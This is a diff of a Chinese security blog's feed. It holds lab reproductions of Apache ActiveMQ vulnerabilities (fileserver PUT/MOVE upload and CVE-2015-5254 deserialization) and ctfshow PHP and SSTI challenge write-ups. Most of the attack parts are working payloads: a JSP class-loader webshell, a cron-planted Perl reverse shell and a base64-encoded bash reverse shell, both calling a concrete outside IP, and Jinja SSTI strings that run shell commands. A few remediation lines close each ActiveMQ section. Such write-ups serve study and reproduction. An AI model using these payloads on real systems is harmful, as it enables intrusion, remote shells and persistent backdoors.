-<p>接着我们向fileserver上传文件</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>779</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader &#123;</span></span><br><span class="line"><span class="language-gradle">U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">super</span>(c);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span>[] b) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"> </span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.<span class="keyword">class</span>).invoke(clazz.newInstance(), str);</span></span><br><span class="line"><span class="language-gradle">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.<span class="keyword">class</span>).invoke(decoder, str);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle">String cls = request.getParameter(<span class="string">&quot;ewoji&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>记住后缀不能是jsp</p>
-<p>接着Move</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/ewoji.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>成功将木马打入</p>
-<p>注意这里ewoji.txt一定要和ewoji.jsp前缀名字相同，不然会把ewoji.jsp视为一个文件，fileserver会异常关闭，就打不了了呀</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531215835511.png"  alt="image-20240531215835511"></p>
-<p>antsword启动</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161710100.png"  alt="image-20240531161710100"></p>
-<p>需要admin权限，记得加请求头</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161641254.png"  alt="image-20240531161641254"></p>
-<p>getshell !!!!</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240531221257330.png"  alt="image-20240531221257330"></p>
-<h2 id="写入crontab"><a href="#写入crontab" class="headerlink" title="写入crontab"></a>写入crontab</h2><p>大致和上面的一样，就是不用登录</p>
-<p>上传</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;47.100.177.241&quot;</span>;<span class="variable">$p</span>=<span class="number">23333</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240606143921794.png"  alt="image-20240606143921794"></p>
-<p>如果是用bp，请确保正文最后是\n而不是\r\n</p>
-<p>移动</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
-
-<p>等待一下</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240606144408059.png"  alt="image-20240606144408059"></p>
-<p>getshell !!!</p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.对上传的文件内容进行检测</p>
-<p>2.限制move方法</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>ActActiveMQ</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ActiveMQ反序列化漏洞(CVE-2015-5254)</title>
-    <url>/2024/05/30/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254/</url>
-    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是漏洞复现第一章了吧</p>
-<p>目标:</p>
-<p>· 看这些大漏洞在实际的应用</p>
-<p>· 品味吸收发现漏洞和挖掘漏洞的过程</p>
-<p>· 修复漏洞</p>
-<p>· 思维发散，思考有没有其他地方会有同样的漏洞</p>
-<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
-<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。本质上还是对JMS的攻击，ActiveMQ不过是一个触发反序列化的跳板。</p>
-<p>有关JMS Attack的文章：</p>
-<p><a class="link"   href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" >us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf (blackhat.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>上一篇的翻译</p>
-<p><a class="link"   href="https://www.anquanke.com/post/id/84954" >【技术分享】使用反序列化漏洞干掉你的JMS-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>在发送object消息时的代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//send</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendObjectMessage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    jmsTemplate.send(<span class="keyword">new</span> <span class="title class_">MessageCreator</span>() &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Message <span class="title function_">createMessage</span><span class="params">(Session session)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Staff</span>(<span class="number">1</span>, <span class="string">&quot;搬砖工&quot;</span>); <span class="comment">// Staff必须实现序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(staff);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//receive</span></span><br><span class="line"> <span class="comment">// 如果是Object消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> ObjectMessage) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjectMessage</span> <span class="variable">om</span> <span class="operator">=</span> (ObjectMessage) message;</span><br><span class="line"></span><br><span class="line">      <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> (Staff) om.getObject();</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;ConsumerService从队列&quot;</span> + destination.toString() + <span class="string">&quot;收到了消息：\t&quot;</span> + staff);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>又到了我们最喜欢的getObject()环节</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530143111195.png"  alt="image-20240530143111195"></p>
-<p>由于ActiveMQ的调试的debug有点复杂，也没来得及看源码</p>
-<p>不过如果你作为挖掘者，在知道以上信息的情况下，一定会源码都不用看，就应该合理猜测在ActiveMQ管理界面中接受消息，就等于执行了以上的receive代码吧，其实真的也不是我懒啦，这确实不用看，直接去试一波就好</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先用nmap扫扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151309225.png"  alt="image-20240530151309225"></p>
-<p>发现了61616端口扫出是apachemq的发出端口，不知道为什么管理的端口没扫出来（pass，就当扫出来了）</p>
-<p><img   src="/../img/$%7Bfiilename%7D/ok-1717053248889-1.jpg"  alt="ok"></p>
-<p>wow，我们成功发现了后台界面(＾－＾)V</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151454795.png"  alt="image-20240530151454795"></p>
-<p>什么，居然用admin和admin就登陆进去了（）</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151523882.png"  alt="image-20240530151523882"></p>
-<p>居然正是漏洞版本，太巧了吧（</p>
-<p>然后我们像接受端口发送信息，然后在在这个界面接受，不就触发了一个反序列化吗</p>
-<p>这里需要用到一个工具jmet（查了一下好像就是类似个攻击脚本吧，真好，永远有配套服务）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载jmet的jar包</span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">#创建external目录，报错让创建的。。。。。。</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure>
-
-<p>之后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;cp README.txt README1.txt&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170736613.png"  alt="image-20240530170736613"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170748146.png"  alt="image-20240530170748146"></p>
-<p>这样就算成功啦，之后反弹shell即可，需要编码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTc3LjI0MS8yMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530171632750.png"  alt="image-20240530171632750"></p>
-<p>getshell  !!!!!</p>
-<h1 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h1><p>1.拒绝反序列化危险的类</p>
-<p>2.解决前台弱口令问题</p>
-<p>3.隐藏接受信息的端口</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>ActActiveMQ</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP特性ctfshow</title>
-    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
-<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
-<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
-<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
-<p>所以把4476转为16进制，在开头加入0x传入即可</p>
-<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
-<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
-<p>i:不区分大小写匹配</p>
-<p>m:以每行为一个单位匹配</p>
-<p>^:匹配单位的开头</p>
-<p>$:匹配单位的末尾</p>
-<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
-<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
-<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
-<p><strong>payload:%0aphp</strong></p>
-<p>%0a是url编码的换行符</p>
-<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
-<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
-<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
-<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
-<p>上面说了0开头会以八进制识别</p>
-<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
-<p>要想输出flag，有三个条件</p>
-<p>1.num不能强等于4476</p>
-<p>2.num中不能有字母</p>
-<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
-<p>第一种方法:</p>
-<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
-<p>第二种方法:</p>
-<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
-<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
-<p>弱等于，用以上第一种方法</p>
-<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
-<p>传入.&#x2F;flag.php即可</p>
-<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
-<p>强度于，数组绕过</p>
-<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
-<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
-<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
-]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -491,108 +569,57 @@
       </tags>
   </entry>
   <entry>
-    <title>SSTI-CTFSHOW</title>
-    <url>/2024/04/12/SSTI-CTFSHOW-1/</url>
+    <title>PHP特性ctfshow</title>
+    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
     <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
 
-<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesn’t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>巨几把详细，使我逐渐理解一切</p>
-<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
-<p>需要在url传入name&#x3D;payload</p>
-<p>但是我们并不知道subclasses()后，os._wrap_close类在哪</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
-<p>小写了个脚本去找</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]需要查找的文本为:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]你可能要找的类有:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]需要匹配的类为:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]下标为&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]继续扣1结束扣0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
-<p>进而payload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
-<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
-<p>一样的name传参，把上题的payload放了进去，给我回了个板脸</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
-<p>不知道禁了什么，我们把payload一个字一个字拆开再用burpsuite爆破进行fuzz</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]需要拆解的文本为&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
-<p>发现把2和3ban掉了，相当于想ban掉<code>os._wrap_close</code>呗</p>
-<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
-<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
-<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
-<p>payload4:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>最喜欢的最短的一个:</p>
-<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
-<p>变种最多的一集，在网上看到很多，不过都2024了还会有开发人员犯这个病吗，实战估计是用不到了</p>
-<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
-<p>参数逃逸，好喜欢，高效帅气巧妙</p>
-<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
-<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>ban掉了arg和单双引号</p>
-<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
-<p>再在cookie加入<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>即可</p>
-<p>我才知道cookie传多个值是需要分号而不是&amp;</p>
-<p>而且这里传入的cookie不能有字符是url编码的，不知道是hackbar不帮我编码呢，还是服务器不帮我解码呢，还是说cookie本来就不需要url编解码</p>
-<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>在前ban掉了arg和单双引号和中括号</p>
-<p>和上题一样的payload</p>
-<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>ban掉了下划线</p>
-<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
-<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
-<p>d原来之前可以不用cookie，用values就好</p>
-<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>之前的基础上禁用了os</p>
-<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
-<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
-<p>这里get方法想出来很顺滑，因为一开始咱们想把os逃出来可以想的是reque.values.gogo，但是这个弄出来只能返回字符串”os”,并不能返回类os,所以用get</p>
-<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#过滤了&#123;&#123;,用&#123;%%&#125;加print即可</span><br></pre></td></tr></table></figure>
-
